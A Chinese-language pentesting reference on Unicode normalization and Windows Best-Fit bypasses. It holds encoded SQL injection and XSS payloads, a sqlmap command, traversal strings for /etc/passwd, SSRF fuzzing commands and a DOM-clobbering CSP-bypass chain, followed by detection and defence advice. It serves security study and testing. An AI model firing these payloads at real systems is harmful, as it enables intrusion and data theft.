---
attack_surface: [编码/序列化滥用, 注入类, 认证/授权绕过]
impact: [完整性破坏, 权限提升, 远程代码执行, 信息泄露]
risk_level: 高
prerequisites:
  - Unicode 编码基础（Code Point / UTF-8 / UTF-16）
  - 至少一种注入类漏洞的基本利用能力（SQLi / XSS / SSRF）
  - 理解输入验证与规范化的先后顺序
related_techniques:
  - sql-injection
  - xss-cross-site-scripting
  - ssrf
  - path-traversal
  - waf-bypass
  - request-smuggling
difficulty: 中级
tools:
  - recollapse
  - sqlmap (unicode template)
  - Burp Suite Intruder
---

# Unicode Normalization — Unicode 规范化攻击全矩阵
> 关联文档：[IDOR](../../IDOR/README.md) · [SQL Injection](../../User%20input/Search/SQL%20Injection/README.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [Path Traversal](../../User%20input/Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md) · [WAF Bypass](../../Proxies/Proxy%20%26%20WAF%20Protections%20Bypass/README.md)

---

# 0x01 原理与分类

## 1.0 TL;DR

Unicode 规范化攻击的**根本原因**是：应用程序在**安全校验之后、实际使用之前**对用户输入执行了 Unicode 规范化，导致校验时看到的字符与实际执行时的字符不同。攻击者利用 Unicode 中"多个不同字节序列表示同一逻辑字符"的等价关系，提交一个能通过校验的等价字符，在规范化后变成恶意字符，从而绕过 WAF、输入黑名单、正则过滤等防护机制。

**核心攻击窗口**：`输入校验 → Unicode 规范化 → 业务使用` 这个处理链中的"规范化"步骤，将原本安全的 Unicode 字符变为危险的 ASCII 字符。

## 1.1 根本原理 — Unicode 等价性

Unicode 标准定义了两种字符等价关系，这是所有规范化攻击的理论基础：

**规范等价（Canonical Equivalence）**：两个字符序列在视觉和语义上完全相同。例如 `é` 既可以用单一码点 `U+00E9`（LATIN SMALL LETTER E WITH ACUTE）表示，也可以用组合序列 `U+0065`（`e`）+ `U+0301`（COMBINING ACUTE ACCENT）表示。二者二进制完全不同，但对人类阅读者而言是"同一个字符"。

**兼容等价（Compatibility Equivalence）**：字符序列表示同一抽象字符，但视觉呈现可能不同。例如上标数字 `²`（U+00B2）与普通数字 `2`（U+0032）在 Unicode 兼容等价意义上被视为"同一字符"。这是攻击者最重要的武器——像 `﹤`（U+FE64）这样"看起来无害"的字符，在兼容规范化后会变成 `<`（U+003C）。

```python
# 同一个"é"的两种二进制表示
import unicodedata
a = "chloé"       # e + combining acute
b = "chloé"         # precomposed é
print(a == b)            # False — 字节不同
print(unicodedata.normalize("NFKD", a) == unicodedata.normalize("NFKD", b))  # True
```

## 1.2 四种规范化算法

Unicode 标准定义了四种规范化形式（NFC、NFD、NFKC、NFKD），每种对上述等价关系的处理策略不同：

| 算法 | 策略 | 核心行为 | 攻击面 |
|------|------|---------|--------|
| **NFC** | 规范组合 | 先分解再重新组合，使用预组合字符 | 较少，因仅做规范映射 |
| **NFD** | 规范分解 | 将所有字符分解为基本字符+组合标记 | 较少 |
| **NFKC** | 兼容组合 | 先做兼容分解，再做规范组合 | **高** — 兼容等价字符被转换为 ASCII |
| **NFKD** | 兼容分解 | 先做兼容分解，再做规范分解 | **高** — 同 NFKC，是攻击最常见的利用形式 |

**攻击者最关心 NFKC 和 NFKD**，因为它们会将兼容等价字符（全角字母、上标数字、罗马数字等）转换为对应的 ASCII 字符。例如：

| Unicode 字符 | 码点 | NFKD 规范化结果 | 攻击意义 |
|-------------|------|----------------|---------|
| `＜` (FULLWIDTH LESS-THAN) | U+FF1C | `<` (U+003C) | 注入 HTML 标签 |
| `＇` (FULLWIDTH SINGLE QUOTE) | U+FF07 | `'` (U+0027) | 突破 SQL 字符串边界 |
| `＂` (FULLWIDTH DOUBLE QUOTE) | U+FF02 | `"` (U+0022) | 突破属性边界 / Shell 参数 |
| `／` (FULLWIDTH SOLIDUS) | U+FF0F | `/` (U+002F) | 路径遍历 |
| `＃` (FULLWIDTH NUMBER SIGN) | U+FF03 | `#` (U+0023) | URL 片段注入 / SSRF |
| `K` (KELVIN SIGN) | U+212A | `K` (U+004B) | 规范化探针 |

## 1.3 攻击面分类

Unicode 规范化本身不是漏洞类型——它是一种**绕过技术**，可应用于多种注入场景：

```
Unicode 规范化绕过
├── 注入类绕过
│   ├── SQL 注入：绕过单引号/双引号黑名单过滤
│   ├── XSS：绕过尖括号/事件处理器过滤
│   ├── 命令注入：绕过 Shell 转义（全角引号 → 半角引号）
│   └── SSTI：绕过模板表达式过滤
├── 路径/URL 处理绕过
│   ├── 路径遍历：全角斜线/反斜线 → 正常斜线（Windows Best-Fit）
│   ├── SSRF：Regex 使用规范化判断，实际请求用原始字符
│   └── Open Redirect：同上差异
├── 逻辑/认证绕过
│   ├── 用户名仿冒：注册 "admin" 但用 Unicode 同形字
│   ├── 邮箱验证绕过：Unicode 邮箱地址被规范化后匹配白名单
│   └── IDOR 增强：编码后的 ID 被规范化后暴露原始值
└── 协议/编码滥用
    ├── \u 转 %：Unicode 转义 → URL 编码 → 注入
    └── Unicode Overflow：超大码点溢出生成目标 ASCII 字符
```

---

# 0x02 规范化检测与发现

## 2.1 规范化探针

判断目标应用是否执行了 Unicode 规范化的最简单方法——发送 Kelvin Sign，观察是否返回 `K`：

```http
GET /search?q=%e2%84%aa HTTP/1.1
Host: target.com
```

`%e2%84%aa` 是 `K`（KELVIN SIGN, U+212A）的 UTF-8 编码。在 NFKC/NFKD 规范化下，它会变成 `K`。如果响应中回显了 `K`（而非原始的 `K`），说明后端存在 Unicode 规范化。

另一个更复杂的探针——完整名字的规范化：

```
%E2%84%AA → K
%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83 → Leonishan
```

## 2.2 等价字符速查表

在实际构造 Payload 时，以下是最高频使用的 Unicode 等价字符（全部基于 NFKC/NFKD 兼容映射）：

| ASCII 目标 | Unicode 等价 | 码点 | URL 编码 | 注入场景 |
|-----------|-------------|------|---------|---------|
| `<` | `﹤` | U+FE64 | `%ef%b9%a4` | XSS 标签注入 |
| `>` | `﹥` | U+FE65 | `%ef%b9%a5` | XSS 标签闭合 |
| `'` | `＇` | U+FF07 | `%ef%bc%87` | SQL 字符串突破 |
| `"` | `＂` | U+FF02 | `%ef%bc%82` | 属性注入 / Shell 参数污染 |
| `/` | `／` | U+FF0F | `%ef%bc%8f` | 路径遍历 / 协议分隔 |
| `\` | `＼` | U+FF3C | `%ef%bc%bc` | Windows 路径遍历 |
| `#` | `＃` | U+FF03 | `%ef%bc%83` | URL 片段 / SSRF |
| `&` | `＆` | U+FF06 | `%ef%bc%86` | 参数分隔注入 |
| `\|` | `｜` | U+FF5C | `%ef%bd%9c` | SQL / Shell 管道 |
| `=` | `⁼` | U+207C | `%e2%81%bc` | SQL 条件注入 |
| `-` | `﹣` | U+FE63 | `%ef%b9%a3` | SQL 注释（`--`） |
| `*` | `﹡` | U+FE61 | `%ef%b9%a1` | 文件匹配 / 通配符 |
| `o` | `ᴼ` | U+1D3C | `%e1%b4%bc` | SQL 关键字混淆（`OR` → `O`） |
| `r` | `ᴿ` | U+1D3F | `%e1%b4%bf` | SQL 关键字混淆（`OR` → `R`） |
| `1` | `¹` | U+00B9 | `%c2%b9` | 数字混淆 |
| `:` | `：` | U+FF1A | `%ef%bc%9a` | 协议分隔 / Header 注入 |
| `.` | `．` | U+FF0E | `%ef%bc%8e` | 域名 / 路径混淆 |

> 完整的 Unicode 等价字符映射表可在线查询：[appcheck-ng 等价表](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html) 和 [0xacb normalization table](https://0xacb.com/normalization_table)。

---

# 0x03 SQL 注入绕过

## 3.1 攻击模型：规范化时间窗口

这是 Unicode 规范化在 SQL 注入中最典型的利用模式：

```
用户输入 → [安全清洗：删除/转义 ' 和 "] → [Unicode 规范化：NFKD] → [拼接到 SQL 查询]
                                                    ↑
                                            此处将 Unicode 引号
                                            变为 ASCII 引号
```

关键洞察：清洗步骤不认识 Unicode 全角引号 `＇`（U+FF07），所以放行；规范化步骤不认识 SQL 语义，所以忠实地将 `＇` 转换为 `'`——结果是 SQL 查询中出现了攻击者可控的单引号。

## 3.2 Payload 构造

**基础绕过（黑名单过滤 `'`）：**

将 payload `' OR 1=1-- -` 中的每个 ASCII 敏感字符替换为 Unicode 等价：

```sql
-- ASCII 原始 payload（会被过滤 ' 和 -）
' OR 1=1-- -

-- Unicode 规范化绕过 payload（URL 编码后发送）
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
-- 解码后：＇ ᴼᴿ ¹⁼¹﹣﹣ ﹣
-- NFKD 规范化后：' OR 1=1-- -
```

**双引号变体（字符串分隔符为 `"` 时）：**

```sql
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3
-- 规范化后：" OR 1=1-- -
```

**管道连接符变体（MySQL / PostgreSQL 等支持 `||` 的数据库）：**

```sql
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
-- 规范化后：' || 1==1//
```

**完整的 Burp Suite 请求示例：**

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3&password=x
```

## 3.3 sqlmap Unicode 模板

sqlmap 提供了 Unicode 规范化绕过的 tamper 模板。使用 `sqlmap_to_unicode_template` 可以自动生成 Unicode 等价替换规则：

```bash
# 使用 Unicode 模板进行自动化注入
sqlmap -u "http://target.com/search?q=test" \
  --tamper=unicode_urlencode \
  --level=3 --risk=3
```

模板仓库：[carlospolop/sqlmap_to_unicode_template](https://github.com/carlospolop/sqlmap_to_unicode_template)

---

# 0x04 XSS 绕过

## 4.1 核心字符等价

XSS 的 Unicode 规范化绕过依赖将 `<`、`>`、`"`、`'`、`/` 等标签控制字符替换为 Unicode 等价字符。当后端对输入执行规范化（如 `iconv("UTF-8", "ASCII//TRANSLIT", $input)`）后，这些 Unicode 字符被映射为对应的 ASCII 控制字符。

以下是专用于 XSS 的高频替换：

| ASCII | Unicode | 码点 | URL 编码 | XSS 用途 |
|-------|---------|------|---------|---------|
| `<` | `≮` | U+226E | `%e2%89%ae` | 标签开始 |
| `>` | `≯` | U+226F | `%e2%89%af` | 标签闭合 |
| `"` | `＂` | U+FF02 | `%ef%bc%82` | 属性值突破 |
| `'` | `＇` | U+FF07 | `%ef%bc%87` | 事件处理器突破 |
| `/` | `／` | U+FF0F | `%ef%bc%8f` | 闭合标签 |
| `=` | `⁼` | U+207C | `%e2%81%bc` | 属性赋值 |

## 4.2 Payload 示例

**基础 XSS 反射型绕过：**

```html
<!-- 原始 payload（会被过滤 < > "） -->
<img src=x onerror="alert(1)">

<!-- Unicode 规范化绕过 -->
﹤img src⁼x onerror⁼＂alert(1)＂﹥
```

在 URL 中发送：
```
/search?q=%ef%b9%a4img+src%e2%81%bcx+onerror%e2%81%bc%ef%bc%82alert(1)%ef%bc%82%ef%b9%a5
```

**SVG 向量（更复杂的上下文）：**

```html
≮svg onload⁼＂alert(1)＂≯
```

**需要注意的局限性**：规范化绕过依赖于后端执行 NFKC/NFKD 或 `ASCII//TRANSLIT` 转换。如果后端仅做输入校验而不做后续规范化，此技术无效。因此必须先通过 Kelvin Sign 探针确认规范化存在。

---

# 0x05 其他注入场景绕过

## 5.1 SSRF / Open Redirect — Regex 规范化差异

这是一个更微妙的场景：后端的**正则校验使用规范化后的 URL**，但**实际 HTTP 请求使用原始 Unicode 字符**。攻击者可以构造一个"规范化后看起来安全，但实际请求时变成危险"的 URL。

**攻击模型：**

```
用户输入 URL → [校验：NFKD 规范化后匹配 regex ^https://trusted\.com] → [实际请求使用原始字节]
                                 ↑                                           ↑
                          看到的是规范化后的安全 URL                        发出的是包含 Unicode 等价字符的 URL
```

工具 [**recollapse**](https://github.com/0xacb/recollapse) 专门用于此场景——它生成输入 URL 的 Unicode 等价变体，用于 Fuzzing 后端在"规范化用于判断 vs 原始用于执行"之间的差异。

```bash
# 生成 URL 的 Unicode 变体进行 fuzzing
recollapse -u "http://evil.com" -o payloads.txt

# 对每个变体尝试 SSRF
ffuf -u "http://target.com/fetch?url=FUZZ" -w payloads.txt -fc 403
```

## 5.2 路径遍历 — Windows Best-Fit 映射

Windows 的 Best-Fit 机制会将无法在目标代码页中显示的 Unicode 字符映射为"最接近"的 ASCII 字符。这为路径遍历攻击提供了独特的绕过途径。

**攻击效果**：发送一个包含 Unicode 等价斜线字符的路径，后端校验时看到的是"无害字符串"，但在 Windows API 的 `W→A` 转换过程中，这些字符被 Best-Fit 映射为 `/` 或 `\`，产生路径遍历：

```
# 发送
../../../etc/passwd（其中 / 替换为全角 ／ U+FF0F）

# 校验时（Unicode 原样）：．．／．．／．．／etc／passwd  ← 无遍历
# Best-Fit 转换后：../../../etc/passwd                   ← 路径遍历
```

**Best-Fit 映射查询**：在 [worst.fit/mapping](https://worst.fit/mapping/) 中可查询任意 ASCII 字符的 Best-Fit 等价 Unicode 字符。常用映射：

| 目标 ASCII | 码点 | Best-Fit 源字符 |
|-----------|------|----------------|
| `/` (0x2F) | 多个 | 全角斜线、分号等 |
| `\` (0x5C) | 多个 | 全角反斜线、日元符号 ¥ 等 |
| `"` (0x22) | U+FF02 | 全角双引号 |

## 5.3 命令注入 — 全角引号绕过 Shell 转义

PHP 的 `escapeshellarg` 和 Python 的 `subprocess.run`（使用 list 参数时）会在参数周围添加引号并转义内部引号。但 Windows Best-Fit 的全角双引号 `＂`（U+FF02）在这种场景下可以绕过：

**攻击原理（基于 Orange Tsai 的 WorstFit 研究）**：

```
应用接收输入 → 校验（看到全角引号 ＂，不视为危险字符）→ W API 调用
→ 内部 A API 调用 → Best-Fit 将 ＂→ " → 参数边界被突破
```

**Python subprocess 示例**（Windows 环境）：

```python
# 用户输入 arg = "a＂ b"
# Python 调用: subprocess.run(["program", arg])
# Windows 内部 W→A 转换后: program "a" b"
# 结果: 一个参数变成了两个参数
```

**PHP escapeshellarg 绕过**（Windows 环境）：
```php
// 用户输入中的全角双引号 ＂（U+FF02）
// escapeshellarg 不认为全角引号需要转义
// 但在 Windows A API 中 Best-Fit 将其变为 "
// 导致命令参数注入
```

> **前提条件**：应用使用 Windows "W" API（如 `GetEnvironmentVariableW`）但内部调用了 "A" API（如 `GetEnvironmentVariableA`），触发 Best-Fit 转换。非 Windows 环境不受此影响。

---

# 0x06 高级技术

## 6.1 Emoji 注入 — 编码转换链攻击

Emoji 注入是 Unicode 规范化的一个特殊子类：问题不在于单个规范化步骤，而在于**多次编码转换的累积效应**。

**经典案例**（[fpatrik 的 XSS 发现](https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209)）：

```php
$str = htmlspecialchars($_GET["str"]);         // Step 1: HTML 实体编码
$str = iconv("Windows-1252", "UTF-8", $str);   // Step 2: 编码转换
$str = iconv("UTF-8", "ASCII//TRANSLIT", $str); // Step 3: 规范化到 ASCII
echo $str;
```

**攻击链分析**：

1. 攻击者发送 `💋img src=x onerror=alert(1)//💛`
2. `htmlspecialchars` 没有发现 `<`、`>`、`"` 等需要转义的字符，原样放行
3. `Windows-1252 → UTF-8` 转换过程中，Emoji 无法映射，产生了一个 Unicode `<` 的近似字符 `‹`
4. `UTF-8 → ASCII//TRANSLIT` 规范化将 `‹` 转换为 `<`
5. 最终输出包含 `<img src=x onerror=alert(1)>`——完整 XSS

**关键教训**：单一安全措施（`htmlspecialchars`）在编码转换链中可能完全失效。攻击者不需要找到 `<` 的 Unicode 等价字符——只需要找到一个**在多次编码转换后变成 `<` 的字符序列**。

## 6.2 `\u` 到 `%` 转换注入 — 完整攻击链

### 6.2.1 漏洞机制

这一技术源于一位独立研究员的真实漏洞报告。核心机制：后端在处理用户输入时，将 Unicode 转义序列的 `\u` 前缀转换为 `%`，使得 Unicode 转义变为 URL 编码字符串，浏览器（或后续处理）再进行 URL 解码时产生原始 ASCII 字符。

```
用户输入 Unicode 字符（如 U+3C4B 㱋）
        ↓
后端将 \u 转换为 %
        ↓
产生 %3c4b
        ↓
URL 解码 → <4b
        ↓
注入 < 字符
```

**探测方法**：向反射型输入点发送一个 Unicode 字符，观察响应中是否出现了其码点对应的 hex 字节。例如发送 `U+0100`，如果响应中包含 `%01%00` 或对应的控制字符，说明存在此转换。

### 6.2.2 任意字符注入

攻击者可以控制注入的字符，方法是在 [unicode-explorer.com](https://unicode-explorer.com/) 中查找以目标 hex 字节开头的 Unicode 字符：

| 目标 ASCII | Hex | 搜索模式 | 结果字符 | 注入效果 |
|-----------|-----|---------|---------|---------|
| `<` | 3C | 码点以 3C 开头 | `㱋` (U+3C4B) | 输出 `<` + 尾部字节 `4B` |
| `>` | 3E | 码点以 3E 开头 | `㸍` (U+3E0B) | 输出 `>` + 尾部字节 `0B` |
| `"` | 22 | 码点以 22 开头 | `∮` (U+222E) | 输出 `"` + 尾部字节 `2E` |

### 6.2.3 尾部字节问题 — 攻击链的核心难题

每个注入的字符都会附带**两个不可控的 hex 字节**（来自原始 Unicode 码点的低位）。例如 `U+3C4B` 产生 `<4B`——`4B` 是尾部，会直接出现在页面上。

**这导致直接写 `<input>` 标签失败**：

```
期望输出: <input id=...>
实际输出: <4Binput id=...>
              ↑ 尾部字节 4B 破坏了标签名
```

### 6.2.4 尾部字节吸收策略 — 利用 HTML 元素名

解决方案：找一个 **HTML 标签名以合法 hex 字符（`[0-9a-f]`）开头**，让尾部字节恰好成为标签名的一部分。

筛选逻辑：
```
标签名必须以 [a-f0-9] 开头且至少 2 个字符
→ 尾部 2 hex 字节恰好构成标签名的前 2 字节
→ 人工补全标签名剩余部分
```

筛选结果（regex: `^[a-f][a-f0-9].*`）：

| 标签 | 起始字节 | 对应 Unicode 码点 | 可用场景 |
|------|---------|--------------------|---------|
| `<data>` | `da` | 搜索以 `3C DA` 开头的码点 | 有 `.value` 属性 |
| `<base>` | `ba` | 搜索以 `3C BA` 开头的码点 | URL 基础路径劫持 |
| `<bdi>` | `bd` | 搜索以 `3C BD` 开头的码点 | 文本方向隔离 |
| `<bdo>` | `bd` | 同上 | 文本方向覆盖 |
| `<abbr>` | `ab` | 搜索以 `3C AB` 开头的码点 | 缩写标记 |
| `<area>` | `ar` | — | `ar` 非 hex，不可用 |

**为什么选择 `<data>`**：`<data>` 元素支持 `.value` 属性，这在 DOM Clobbering 中至关重要——攻击者可以通过 `element.value` 传递 JavaScript payload，而普通 `<div>` / `<span>` 不具备此能力。

### 6.2.5 实战攻击链：DOM Clobbering + CSP 绕过

在真实漏洞案例中，攻击者面对的不仅是字符注入，还有 CSP（Content-Security-Policy）限制——注入的 `<img onerror=...>` 等内联脚本被 CSP 阻止。

**完整攻击链**：

**Step 1 — 突破属性上下文**：注入 `"`（0x22）闭合当前 HTML 属性，注入 `>`（0x3E）闭合当前标签。

```
输入: [Unicode(222E)] [Unicode(3E0B)]
输出: " >  ← 成功逃逸属性上下文
```

**Step 2 — 构建 DOM Clobbering 元素**：注入两个 `<data>` 元素，利用 DOM Clobbering 覆盖 JavaScript 中的全局变量。

```html
<data id="result" name="questionanswer" value="alert(origin)//">
```

通过 DOM Clobbering 的规则：
- `id="result"` 使 `window.result` 指向该元素集合
- `name="questionanswer"` 使 `result.questionanswer` 解析到该元素
- `.value` 返回攻击者控制的 JavaScript 代码

**Step 3 — 触发 eval**：页面中的原始合法脚本（CSP 信任的源）执行 `eval(result.questionanswer.value)`，而此值已被 DOM Clobbering 劫持为攻击者的 payload。CSP 不会阻止——因为执行来自受信任脚本。

```javascript
// 原始代码（受 CSP 信任）
var result = result || {};
// ... 
eval(result.questionanswer.value);  // ← 此时 value = "alert(origin)//"
```

**Step 4 — 自动提交**：使用 `auto_submit` 参数避免需要用户交互。

### 6.2.6 攻击链总结

```
Unicode \u→% 注入
    ↓ 注入 "> 逃逸属性上下文
    ↓ 注入 <data id=result name=questionanswer value=PAYLOAD>
    ↓ 尾部字节 da/ta 恰好构成标签名 data
DOM Clobbering
    ↓ window.result.questionanswer.value → PAYLOAD
    ↓ 受信任脚本 eval(result.questionanswer.value)
CSP 绕过
    ↓ 受信任脚本执行攻击者代码
XSS 完成
```

> **关键教训**：这个攻击链完美展示了为什么 Unicode 注入不是孤立的——它需要结合 DOM Clobbering（变量劫持）和 CSP 策略理解（信任边界），三个看似无关的技术在 Unicode `\u`→`%` 转换的串联下形成完整攻击路径。

## 6.3 Unicode Overflow — 字节溢出生成目标字符

PortSwigger 的研究揭示了一种更底层的技术：当系统使用特定编码处理超大 Unicode 码点时，整型溢出可以产生任意目标 ASCII 字符。

**原理**：一个字节的最大值是 255（0xFF）。当 Unicode 码点值超过此范围时，在某些编码转换实现中，高位被截断，只保留低 8 位，从而生成目标字符。

**实例**：以下 Unicode 码点在特定编码处理后都会产生 `A`（0x41）：

| Unicode 码点 | 十进制 | 低 8 位 | 输出字符 |
|-------------|--------|---------|---------|
| U+4E41 | 20033 | 0x41 | `A` |
| U+4F41 | 20289 | 0x41 | `A` |
| U+5041 | 20545 | 0x41 | `A` |
| U+5141 | 20801 | 0x41 | `A` |

**攻击意义**：此技术可以绕过基于黑名单的字符过滤。即使过滤器拦截了所有 `<`（0x3C）的已知 Unicode 等价，攻击者仍可以通过"溢出生成 `<` 的码点"来实现注入。

```python
# 查找溢出产生目标字符的码点
target = 0x3C  # <
# 任何码点值满足 (codepoint & 0xFF) == target 的字符都可能产生 <
for cp in range(0x100, 0x10000):
    if cp & 0xFF == target:
        print(f"U+{cp:04X} → {chr(cp) if cp < 0x10000 else '?'} → 0x{cp & 0xFF:02X}")
```

## 6.4 Windows Best-Fit / Worst-Fit 机制

Orange Tsai 在 2025 年的研究[《WorstFit: Unveiling Hidden Transformers in Windows ANSI》](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) 系统性地揭示了 Windows 内部的一个隐藏攻击面：**Best-Fit 映射**。

**技术机制**：

Windows 提供两类 API：
- **W API**（Wide）：处理 UTF-16 Unicode 字符串，如 `GetEnvironmentVariableW`
- **A API**（ANSI）：处理特定代码页的 ANSI 字符串，如 `GetEnvironmentVariableA`

当一个应用的外部接口使用 W API（接收 Unicode），但内部调用 A API（只能处理 ANSI）时，Windows 会自动执行一次字符集转换。对于无法在目标代码页中表示的 Unicode 字符，Windows 使用 Best-Fit 表将其映射为"最接近"的可用字符。

**安全影响**：

Best-Fit 不仅仅是 `/` 和 `\` 的映射。Orange Tsai 的研究揭示了几个关键的绕过场景：

1. **黑名单绕过**：黑名单中只有 ASCII 危险字符，但 Best-Fit 使 Unicode 字符进入后自动变为危险字符
2. **路径遍历**：Best-Fit 中有大量字符映射到 `/` 和 `\`
3. **Shell 参数注入**：全角引号 Best-Fit 为半角引号，突破单参数限制
4. **修复责任归属不清**：微软和应用程序开发者互相认为"这是对方的问题"

```python
# WorstFit 映射查询示例（使用 worst.fit API）
# 查询所有会 Best-Fit 到 / (0x2F) 的 Unicode 字符
# https://worst.fit/mapping/#to:0x2f
```

> **影响范围**：这个问题的修复非常困难——因为它涉及 Windows 操作系统的底层行为，且大量旧版应用依赖 W→A API 调用链。Orange Tsai 指出多个已发现的漏洞被判定为"不修复"。

---

# 0x07 检测与防御

## 7.1 检测方法

**手工探测流程**：

1. **Kelvin Sign 探针**：发送 `%e2%84%aa`（U+212A），观察是否返回 `K`
2. **名字探针**：发送 `%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83`，观察是否返回 `Leonishan`
3. **注入探针**：在疑似注入点发送 Unicode 等价 Payload，观察是否触发注入
4. **编码探针**：发送 `%5c%75`（`\u`），观察是否被 URL 二次解码

**自动化 Fuzzing**：

使用 recollapse 对目标 URL 的每个参数生成 Unicode 变体：

```bash
# 安装 recollapse
pip install recollapse

# 对参数值生成 Unicode 变体
recollapse -u "http://target.com/search?q=test" -o unicode_payloads.txt

# 结合 Burp Intruder / ffuf 进行模糊测试
ffuf -u "http://target.com/search?q=FUZZ" -w unicode_payloads.txt -fc 403
```

**测试清单**：

- [ ] Kelvin Sign 规范化测试
- [ ] 全角 `<` `>` 是否在 HTML 上下文生效
- [ ] 全角 `'` `"` 是否在 SQL / 属性上下文生效
- [ ] 全角 `/` `\` 是否可触发路径遍历
- [ ] `\uXXXX` 是否被转为 `%XXXX`
- [ ] Emoji 是否触发编码转换链
- [ ] Windows 目标额外测试 Best-Fit 路径（全角引号 → 参数注入）

## 7.2 防御体系

**分层防御策略**：

| 层级 | 措施 | 目的 |
|------|------|------|
| **输入层** | 在规范化**之前**执行 Unicode 感知的输入校验 | 不让恶意 Unicode 进入系统 |
| **规范化层** | 明确控制何时、何处进行规范化 | 消除"隐含规范化"行为 |
| **输出层** | 使用参数化查询 / 安全模板而非字符串拼接 | 即使恶意字符通过也无效 |

**具体措施**：

1. **不要在安全校验之后执行规范化**

   规范化应该是输入处理链的**第一步**，而非**中间步骤**：
   ```
   正确顺序：Unicode 规范化 → 输入校验 → 业务使用
   危险顺序：输入校验 → Unicode 规范化 → 业务使用  ← 规范化攻击窗口
   ```

2. **使用参数化查询和模板引擎**

   SQL 注入不应依赖字符过滤来防御——使用 Prepared Statement：
   ```java
   // 正确：参数化查询，不受规范化影响
   PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
   stmt.setString(1, userInput);  // 即使包含 ' 也安全
   ```

3. **Unicode 感知的 WAF 规则**

   WAF 规则应覆盖 Unicode 等价字符，而不是仅拦截 ASCII 危险字符：
   ```
   错误规则：拦截 / (<|>)/
   正确规则：拦截 /(<|>|﹤|﹥|≮|≯|...)/
   ```

4. **编码规范化后置校验**

   如果必须在校验后规范化，在规范化之后增加二次校验：
   ```
   输入 → 第一次校验 → 业务规范化 → 第二次校验 → 使用
   ```

5. **Windows 特定防御**

   - 尽量使用 W API 端到端，避免 W→A 转换
   - 对接收用户输入的程序，显式指定代码页而非依赖系统默认
   - 审计所有 `W→A` API 调用链

---

## 参考资料

- [Unicode Normalization Vulnerabilities: The Special K Polyglot — appcheck-ng](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)
- [WorstFit: Unveiling Hidden Transformers in Windows ANSI — Orange Tsai](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)
- [Bypassing Character Blocklists with Unicode Overflows — PortSwigger Research](https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows)
- [Unicode Normalization Table — 0xacb](https://0xacb.com/normalization_table)
- [recollapse: Unicode Variation Generator — 0xacb](https://github.com/0xacb/recollapse)
- [sqlmap Unicode Template — carlospolop](https://github.com/carlospolop/sqlmap_to_unicode_template)
- [Best-Fit Mapping Lookup — worst.fit](https://worst.fit/mapping/)
- [XSS via Emoji Encoding Mismatch — fpatrik](https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209)
- [Bypass WAF with Unicode — jlajara](https://jlajara.gitlab.io/Bypass_WAF_Unicode)
- [\u to % Injection — YouTube (LiveOverflow)](https://www.youtube.com/watch?v=aUsAHb0E7Cg)
- [Why Does Directory Traversal Attack %c0%af Work? — Security.SE](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
- [Creative Usernames and Unicode — Spotify Labs](https://labs.spotify.com/2013/06/18/creative-usernames/)
